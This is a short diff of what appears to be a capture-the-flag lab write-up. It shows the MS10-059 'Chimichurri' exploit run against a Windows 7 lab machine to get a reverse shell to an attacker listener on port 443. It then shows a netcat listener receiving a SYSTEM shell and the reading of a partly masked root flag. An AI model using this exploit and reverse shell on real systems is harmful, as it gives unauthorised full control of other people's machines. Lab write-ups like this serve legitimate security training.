@@ -317,12 +317,19 @@
 	C:\Users\tolis\Desktop\tmp> ms10-059.exe 10.10.17.8 443
 	/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 
+// We got NT/SYSTEM !!!
 	
-	
-	
-///ss
+	$ sudo rlwrap nc -lvnp 443
+	listening on [any] 443 ...
+	connect to [10.10.17.8] from (UNKNOWN) [10.10.10.11] 51258
+	Microsoft Windows [Version 6.1.7600]
+	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
+	C:\Users\tolis\Desktop\tmp>whoami
+	whoami
+	nt authority\system
 
+// We got root flag !
 
-root.txt
-ce65ce.......................
+	C:\Users\Administrator\Desktop> type root.txt
+	ce65ceee6............................
